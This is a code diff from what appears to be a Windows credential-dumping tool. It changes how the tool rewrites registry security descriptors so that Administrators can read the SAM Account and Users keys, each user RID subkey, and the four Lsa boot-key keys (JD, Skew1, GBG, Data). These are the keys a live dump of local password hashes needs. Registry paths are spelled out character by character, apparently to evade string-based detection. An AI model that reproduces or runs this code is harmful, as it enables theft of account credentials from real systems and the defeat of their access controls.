@@ -484,7 +484,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 	return;
 }
 
-// Fixed pool backing the chained list of saved descriptors; rewriting both subtrees touches well under MAX_DACLSAVES keys.
+// Fixed pool backing the chained list of saved descriptors; only the handful of keys the dump opens are rewritten (Account, Users, its RID subkeys, the four Lsa boot-key keys), well under MAX_DACLSAVES.
 #define MAX_DACLSAVES 128
 static DACLSAVE savesPool[MAX_DACLSAVES];
 static ULONG savesCount;
@@ -569,9 +569,8 @@ static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE* saves, PSECUR
 	*saves = save;
 }
 
-// Walk the subtree below each granted key and hand every child to the same treatment.
-static void grantRegistryTree(const WCHAR RegPath[], PDACLSAVE* saves, PSECURITY_DESCRIPTOR newDescriptor) {
-	WCHAR childPath[MAX_SECURITY_LENGTH];
+// The dump only opens the RID subkeys of Users (children whose name starts with 00, within the same first MAX_SAM_ENTRIES window), so exactly those get the same treatment.
+static void grantRegistryUsers(const WCHAR UsersPath[], PDACLSAVE* saves, PSECURITY_DESCRIPTOR newDescriptor) {
 	UCHAR fullInfoBuffer[512];
 	UCHAR basicInfoBuffer[sizeof(KEY_BASIC_INFORMATION) + MAX_SECURITY_LENGTH];
 	PKEY_FULL_INFORMATION fullInfo = (PKEY_FULL_INFORMATION)fullInfoBuffer;
@@ -582,32 +581,29 @@ static void grantRegistryTree(const WCHAR RegPath[], PDACLSAVE* saves, PSECURITY
 	ULONG resultLength;
 	ULONG ret;
 
-	// Apply the grant to this node first so the children below it can be enumerated.
-	grantRegistryKeyDacl(RegPath, saves, newDescriptor);
-
-	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
+	pMyRtlInitUnicodeString(&UnicodeRegPath, UsersPath);
 	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-	// Administrators own the key now, so opening it for enumeration succeeds through the new DACL granting KEY_READ.
+	// Administrators hold the granted KEY_READ now.
 	// NtQueryKey requires KEY_QUERY_VALUE on the handle, NtEnumerateKey requires KEY_ENUMERATE_SUB_KEYS: handle access is checked against the mask granted at open, independently of the DACL.
 	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
-	DebugPrintf("NtOpenKey(key, KEY_READ) returned 0x%08lX\n", ret);
+	DebugPrintf("NtOpenKey(Users, KEY_READ) returned 0x%08lX\n", ret);
 
 	if (!NT_SUCCESS(ret)) {
 		exit(ret);
 	}
 
 	ret = pMyNtQueryKey(key, KeyFullInformation, fullInfo, sizeof(fullInfoBuffer), &resultLength);
-	DebugPrintf("NtQueryKey(subkey count) returned 0x%08lX\n", ret);
+	DebugPrintf("NtQueryKey(Users subkey count) returned 0x%08lX\n", ret);
 
 	if (!NT_SUCCESS(ret)) {
 		exit(ret);
 	}
 
-	// The subkey count is only valid once the query succeeded.
-	DebugPrintf("Key holds %lu subkeys\n", fullInfo->SubKeys);
+	// The subkey count is only valid once the query succeeded; the window matches the walk the dump itself performs.
+	DebugPrintf("Users key holds %lu subkeys; granting the ones starting with 00 within the first %d\n", fullInfo->SubKeys, MAX_SAM_ENTRIES);
 
-	for (ULONG i = 0; i < fullInfo->SubKeys; i++) {
+	for (ULONG i = 0; i < fullInfo->SubKeys && i < MAX_SAM_ENTRIES; i++) {
 		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, basicInfo, sizeof(basicInfoBuffer), &resultLength);
 
 		if (!NT_SUCCESS(ret)) {
@@ -615,22 +611,19 @@ static void grantRegistryTree(const WCHAR RegPath[], PDACLSAVE* saves, PSECURITY
 			exit(ret);
 		}
 
-		ULONG nameChars = basicInfo->NameLength / sizeof(WCHAR);
-		ULONG base = 0;
+		WCHAR ridName[MAX_KEY_LENGTH] = {};
+		if (!CopyCountedWideString(ridName, MAX_KEY_LENGTH, basicInfo->Name, basicInfo->NameLength)) {
+			DebugPrintf("Skipping Users subkey with invalid name length: %lu bytes\n", basicInfo->NameLength);
+			continue;
+		}
 
-		while (RegPath[base] != 0) {
-			childPath[base] = RegPath[base];
-			base++;
-		}
-		if (base > 0 && childPath[base - 1] != L'\\') {
-			childPath[base++] = L'\\';
-		}
-		for (ULONG j = 0; j < nameChars; j++) {
-			childPath[base + j] = basicInfo->Name[j];
-		}
-		childPath[base + nameChars] = 0;
+		if (wcsncmp(L"00", ridName, wcslen(L"00")) == 0) {
+			WCHAR ridPath[MAX_PATH];
+			wcscpy_s(ridPath, MAX_PATH, UsersPath);
+			wcsncat_s(ridPath, MAX_PATH, ridName, _TRUNCATE);
 
-		grantRegistryTree(childPath, saves, newDescriptor);
+			grantRegistryKeyDacl(ridPath, saves, newDescriptor);
+		}
 	}
 
 	pMyNtClose(key);
@@ -701,13 +694,33 @@ PDACLSAVE grantRegistryAccess() {
 		exit(ret);
 	}
 
-	WCHAR RegPathSAM[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\0' };
-	WCHAR RegPathLsa[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\0' };
+	// Only the handful of keys the live dump opens are rewritten, and nothing else:
+	// Domains\Account (F value read), Domains\Account\Users (RID walk within its own MAX_SAM_ENTRIES window), every RID subkey the walk covers, and the four boot-key class keys Lsa\JD, Lsa\Skew1, Lsa\GBG and Lsa\Data.
+	// Domains\Account\Users itself and the RID keys are individually treated because protected DACLs on child keys never inherit a grant from their parent.
+	WCHAR RegPathAccount[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\', L'\0' };
+	WCHAR RegPathUsers[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\',L'U',L's',L'e',L'r',L's',L'\\', L'\0' };
+	WCHAR RegLsa[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\\', L'\0' };
+	WCHAR sJd[] = { L'J',L'D', L'\0' };
+	WCHAR sSkew1[] = { L'S',L'k',L'e',L'w',L'1', L'\0' };
+	WCHAR sGbg[] = { L'G',L'B',L'G', L'\0' };
+	WCHAR sData[] = { L'D',L'a',L't',L'a', L'\0' };
+
+	PWCHAR lsaChildren[4] = { sJd, sSkew1, sGbg, sData };
 
 	PDACLSAVE saves = NULL;
 
-	grantRegistryTree(RegPathSAM, &saves, &newDescriptor);
-	grantRegistryTree(RegPathLsa, &saves, &newDescriptor);
+	grantRegistryKeyDacl(RegPathAccount, &saves, &newDescriptor);
+	grantRegistryKeyDacl(RegPathUsers, &saves, &newDescriptor);
+	grantRegistryUsers(RegPathUsers, &saves, &newDescriptor);
+
+	for (int i = 0; i < 4; i++) {
+		WCHAR RegLsaChild[MAX_PATH] = L"\0";
+
+		wcscpy_s(RegLsaChild, MAX_PATH, RegLsa);
+		wcsncat_s(RegLsaChild, MAX_PATH, lsaChildren[i], _TRUNCATE);
+
+		grantRegistryKeyDacl(RegLsaChild, &saves, &newDescriptor);
+	}
 
 	return saves;
 }
